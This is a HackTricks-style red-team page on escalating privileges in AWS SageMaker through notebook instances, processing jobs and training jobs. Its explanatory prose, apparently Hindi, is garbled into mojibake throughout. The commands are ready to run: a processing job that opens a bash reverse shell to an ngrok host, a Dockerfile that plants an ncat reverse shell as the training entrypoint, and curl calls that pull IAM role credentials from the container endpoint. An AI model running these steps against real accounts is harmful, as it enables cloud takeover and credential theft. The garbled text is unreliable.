# AWS - Sagemaker Privesc

## AWS - Sagemaker Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

IAM рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рдиреЛрдЯрдмреБрдХ рдмрдирд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ рдЬреЛ рдЗрд╕рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реА рд╣реБрдИ рд╣реИ:
```bash
aws sagemaker create-notebook-instance --notebook-instance-name example \
--instance-type ml.t2.medium \
--role-arn arn:aws:iam::<account-id>:role/service-role/<role-name>
```
рдЙрддреНрддрд░ рдореЗрдВ рдПрдХ `NotebookInstanceArn` рдлрд╝реАрд▓реНрдб рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдореЗрдВ рдирдП рдмрдирд╛рдП рдЧрдП рдиреЛрдЯрдмреБрдХ рдЙрджрд╛рд╣рд░рдг рдХрд╛ ARN рд╣реЛрдЧрд╛ред рдлрд┐рд░ рд╣рдо `create-presigned-notebook-instance-url` API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ URL рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣рдо рдиреЛрдЯрдмреБрдХ рдЙрджрд╛рд╣рд░рдг рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдпрд╣ рддреИрдпрд╛рд░ рд╣реЛ:
```bash
aws sagemaker create-presigned-notebook-instance-url \
--notebook-instance-name <name>
```
Navigate to the URL with the browser and click on \`Open JupyterLab\` in the top right, then scroll down to тАЬLauncherтАЭ tab and under the тАЬOtherтАЭ section, click the тАЬTerminalтАЭ button.

рдЕрдм IAM рднреВрдорд┐рдХрд╛ рдХреЗ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд╛рдЧреЗрдореЗрдХрд░ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

### `sagemaker:CreatePresignedNotebookInstanceUrl`

рдпрджрд┐ Jupyter **рдиреЛрдЯрдмреБрдХ рдкрд╣рд▓реЗ рд╕реЗ рдЪрд▓ рд░рд╣реЗ рд╣реИрдВ** рдФрд░ рдЖрдк рдЙрдиреНрд╣реЗрдВ `sagemaker:ListNotebookInstances` (рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рддрд░реАрдХреЗ рд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ) рдХреЗ рд╕рд╛рде рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдЙрдирдХреЗ рд▓рд┐рдП **рдПрдХ URL рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдкрд┐рдЫрд▓реЗ рддрдХрдиреАрдХ рдореЗрдВ рдмрддрд╛рдП рдЧрдП рдЕрдиреБрд╕рд╛рд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред
```bash
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name <name>
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕рд╛рдЧреЗрдореЗрдХрд░ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдореЗрдВ рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

### `sagemaker:CreateProcessingJob,iam:PassRole`

рдЙрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рд╕рд╛рдЧреЗрдореЗрдХрд░ рдХреЛ рдПрдХ рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧрдЬреЙрдм** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╕рд╛рдЧреЗрдореЗрдХрд░ рднреВрдорд┐рдХрд╛ рд╕рдВрд▓рдЧреНрди рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдХрдВрдЯреЗрдирд░ рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдПрдХ **AWS рдкреНрд░рдмрдВрдзрд┐рдд ECS рдЦрд╛рддрд╛ рдЙрджрд╛рд╣рд░рдг** рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ **рд╕рдВрд▓рдЧреНрди IAM рднреВрдорд┐рдХрд╛ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ**ред
```bash
# I uploaded a python docker image to the ECR
aws sagemaker create-processing-job \
--processing-job-name privescjob \
--processing-resources '{"ClusterConfig": {"InstanceCount": 1,"InstanceType": "ml.t3.medium","VolumeSizeInGB": 50}}' \
--app-specification "{\"ImageUri\":\"<id>.dkr.ecr.eu-west-1.amazonaws.com/python\",\"ContainerEntrypoint\":[\"sh\", \"-c\"],\"ContainerArguments\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14920 0>&1\\\"\"]}" \
--role-arn <sagemaker-arn-role>

# In my tests it took 10min to receive the shell
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" #To get the creds
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд╛рдЧреЗрдореЗрдХрд░ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

рдЙрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдиреМрдХрд░реА рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛, **рдЗрд╕ рдкрд░ рдПрдХ рдордирдорд╛рдирд╛ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рддреЗ рд╣реБрдП** рдЬрд┐рд╕рдореЗрдВ рдПрдХ **рднреВрдорд┐рдХрд╛ рд╕рдВрд▓рдЧреНрди** рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рднреВрдорд┐рдХрд╛ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЪреБрд░рд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред

{% hint style="warning" %}
рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рдХрдард┐рди рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреЛ рдПрдХ рдбреЙрдХрд░ рдЗрдореЗрдЬ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ рд░реЗрд╡ рд╢реЗрд▓ рдпрд╛ рдХреНрд░реЗрдбреНрд╕ рдХреЛ рд╕реАрдзреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рднреЗрдЬреЗ (рдЖрдк рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдиреМрдХрд░реА рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдХрдорд╛рдВрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ)ред
```bash
# Create docker image
mkdir /tmp/rev
## Note that the trainning job is going to call an executable called "train"
## That's why I'm putting the rev shell in /bin/train
## Set the values of <YOUR-IP-OR-DOMAIN> and <YOUR-PORT>
cat > /tmp/rev/Dockerfile <<EOF
FROM ubuntu
RUN apt update && apt install -y ncat curl
RUN printf '#!/bin/bash\nncat <YOUR-IP-OR-DOMAIN> <YOUR-PORT> -e /bin/sh' > /bin/train
RUN chmod +x /bin/train
CMD ncat <YOUR-IP-OR-DOMAIN> <YOUR-PORT> -e /bin/sh
EOF

cd /tmp/rev
sudo docker build . -t reverseshell

# Upload it to ECR
sudo docker login -u AWS -p $(aws ecr get-login-password --region <region>) <id>.dkr.ecr.<region>.amazonaws.com/<repo>
sudo docker tag reverseshell:latest <account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell:latest
sudo docker push <account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell:latest
```
{% endhint %}
```bash
# Create trainning job with the docker image created
aws sagemaker create-training-job \
--training-job-name privescjob \
--resource-config '{"InstanceCount": 1,"InstanceType": "ml.m4.4xlarge","VolumeSizeInGB": 50}' \
--algorithm-specification '{"TrainingImage":"<account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell", "TrainingInputMode": "Pipe"}' \
--role-arn <role-arn> \
--output-data-config '{"S3OutputPath": "s3://<bucket>"}' \
--stopping-condition '{"MaxRuntimeInSeconds": 600}'

#To get the creds
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
## Creds env var value example:/v2/credentials/proxy-f00b92a68b7de043f800bd0cca4d3f84517a19c52b3dd1a54a37c1eca040af38-customer
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕agemaker рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

### `sagemaker:CreateHyperParameterTuningJob`, `iam:PassRole`

рдЙрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ) рдПрдХ **рд╣рд╛рдЗрдкрд░рдкреИрд░рд╛рдореАрдЯрд░ рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдХрд╛рд░реНрдп** рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛, **рдЗрд╕ рдкрд░ рдПрдХ рдордирдорд╛рдирд╛ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рддреЗ рд╣реБрдП** рдФрд░ рдЗрд╕рдХреЗ рд╕рд╛рде рдПрдХ **рднреВрдорд┐рдХрд╛ рд╕рдВрд▓рдЧреНрди** рдХрд░рддреЗ рд╣реБрдПред\
_рдореИрдВрдиреЗ рд╕рдордп рдХреА рдХрдореА рдХреЗ рдХрд╛рд░рдг рдЗрд╕рдХрд╛ рд▓рд╛рдн рдирд╣реАрдВ рдЙрдард╛рдпрд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдкрд┐рдЫрд▓реЗ рд╢реЛрд╖рдгреЛрдВ рдХреЗ рд╕рдорд╛рди рд▓рдЧрддрд╛ рд╣реИ, рд╢реЛрд╖рдг рд╡рд┐рд╡рд░рдг рдХреЗ рд╕рд╛рде PR рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рддрдВрддреНрд░ рдорд╣рд╕реВрд╕ рдХрд░реЗрдВред_

## рд╕рдВрджрд░реНрдн

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рд╣рдореЗрдВ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред**

</details>
{% endhint %}
